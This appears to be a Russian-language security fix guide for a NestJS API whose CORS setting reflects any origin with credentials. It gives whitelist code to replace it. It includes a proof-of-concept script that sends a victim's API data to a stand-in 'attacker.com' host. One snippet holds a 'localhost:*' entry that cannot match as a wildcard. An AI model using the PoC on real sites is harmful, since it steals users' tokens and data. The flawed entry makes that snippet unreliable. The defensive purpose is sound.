````markdown
## 🎯 ЧТО НУЖНО ИСПРАВИТЬ

### Текущая проблема (危險 DANGEROUS):

```typescript
// apps/api/src/main.ts (line 13)
app.enableCors({ origin: true, credentials: true });
```
````

### Почему это вредно

- `origin: true` → отражает **любой** Origin обратно в `Access-Control-Allow-Origin`
- `credentials: true` → браузер отправляет куки/заголовки
- **Комбо** = любой сайт (attacker.com) может украсть токены пользователя

### Атака (PoC)

```html
<!-- https://attacker.com/steal.html -->
<script>
  fetch("https://api.lendsphera.com/landings", { credentials: "include" })
    .then((r) => r.json())
    .then(
      (data) =>
        (new Image().src = `https://attacker.com/log?data=${btoa(JSON.stringify(data))}`)
    );
</script>
<!-- Если пользователь editor.lendsphera.com открыт → токены украдены -->
```

## 📋 ШАГ 3: Обновить main.ts

**Файл:** `apps/api/src/main.ts`

### 3.1 Замени CORS конфиг

**БЫЛО:**

```typescript
app.enableCors({ origin: true, credentials: true });
```

**СТАЛО:**

```typescript
// Получи конфиг
const webOrigin = process.env.WEB_ORIGIN;
const runtimeOrigin = process.env.RUNTIME_ORIGIN;

// Построй список разрешенных origins
const allowedOrigins = [
  webOrigin,
  runtimeOrigin,
  // Для локальной разработки
  "http://localhost:3002",
  "http://localhost:3001",
  "http://localhost:4000",
  // Для тестирования
  "http://localhost:*"
].filter(Boolean); // удали undefined/null

// Регистрируй CORS с whitelist
app.enableCors({
  origin: allowedOrigins,
  credentials: true,
  optionsSuccessStatus: 200,
  methods: "GET,HEAD,PUT,PATCH,POST,DELETE,OPTIONS",
  maxAge: 3600 // 1 час для preflight cache
});
```

### 3.2 Если нужна более гибкая логика (regex/функция)

```typescript
const corsOptions: CorsOptions = {
  origin: (origin, callback) => {
    const allowedOrigins = [
      process.env.WEB_ORIGIN,
      process.env.RUNTIME_ORIGIN,
      // localhost разрешен в dev
      ...(process.env.NODE_ENV === "development"
        ? ["http://localhost:3002", "http://localhost:3001", "http://localhost:4000"]
        : [])
    ].filter(Boolean);

    // Если origin не передан (mobile, curl, server-to-server) → allow
    if (!origin || allowedOrigins.includes(origin)) {
      return callback(null, true);
    }

    // Логируй попытку доступа с неизвестного origin
    console.warn(`CORS rejected from origin: ${origin}`);
    callback(new Error("Not allowed by CORS"));
  },
  credentials: true,
  methods: ["GET", "HEAD", "PUT", "PATCH", "POST", "DELETE", "OPTIONS"],
  maxAge: 3600,
  preflightContinue: false,
  optionsSuccessStatus: 200
};

app.enableCors(corsOptions);
```

## 🚨 ВОЗМОЖНЫЕ ОШИБКИ И РЕШЕНИЯ

| Ошибка                                                                                  | Причина                                                  | Решение                                                                   |
| --------------------------------------------------------------------------------------- | -------------------------------------------------------- | ------------------------------------------------------------------------- |
| "request from origin '<http://localhost:3002>' has been blocked by CORS policy"         | Origin не в whitelist                                    | Проверь .env файл, убедись WEB_ORIGIN=<http://localhost:3002>             |
| ZodError: "WEB_ORIGIN must be a valid URL"                                              | env var содержит невалидный URL                          | Убедись формат: `http://localhost:3002` (не `localhost:3002`)             |

| "credentials mode is 'include', but Access-Control-Allow-Credentials header is missing" | credentials: false в CORS config                         | Убедись `credentials: true` в cors options правильно установлена          |

## 💾 КОД ДЛЯ КОПИРОВАНИЯ (полный main.ts snippet)

```typescript
// apps/api/src/main.ts
import { NestFactory } from "@nestjs/core";
import { CorsOptions } from "@nestjs/common/interfaces/external/cors-options.interface";
import { AppModule } from "./app.module";
import { env } from "./config/env";

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // ============ CORS SECURITY ============
  /**
   * Strict CORS whitelist configuration.
   * Only explicitly allowed origins can make requests to this API.
   * See ADR-006: CORS Security Policy
   */
  const allowedOrigins = [
    env.WEB_ORIGIN,
    env.RUNTIME_ORIGIN,
    ...(env.NODE_ENV === "development"
      ? ["http://localhost:3002", "http://localhost:3001", "http://localhost:4000"]
      : [])
  ].filter(Boolean);

  const corsOptions: CorsOptions = {
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        console.warn(`[CORS] Rejected request from origin: ${origin}`);
        callback(new Error("Not allowed by CORS policy"));
      }
    },
    credentials: true,
    methods: ["GET", "HEAD", "PUT", "PATCH", "POST", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
    maxAge: 3600,
    preflightContinue: false,
    optionsSuccessStatus: 200
  };

  app.enableCors(corsOptions);
  // =========================================

  // ... остальной код bootstrap
  await app.listen(env.PORT);
}

bootstrap();
```
